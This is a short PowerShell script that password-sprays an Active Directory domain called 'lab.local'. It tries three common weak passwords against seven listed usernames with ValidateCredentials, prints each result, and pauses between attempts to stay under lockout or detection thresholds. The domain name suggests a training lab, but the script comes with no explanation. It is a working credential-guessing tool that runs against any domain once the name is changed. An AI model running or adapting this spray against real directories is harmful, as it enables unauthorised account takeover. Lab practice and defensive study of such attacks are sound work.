$usernames = @("BFernandes", "CRonaldo", "KMbappe", "LYamal", "LMessi", "PGuardiola", "SAbrar")
$passwords = @("Summer2026!", "Password1", "Welcome1")
$domain = "lab.local"

Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $domain)

foreach ($password in $passwords) {
    foreach ($username in $usernames) {
        $result = $context.ValidateCredentials($username, $password)
        Write-Host "$username : $password : $result"
        Start-Sleep -Milliseconds 500
    }
}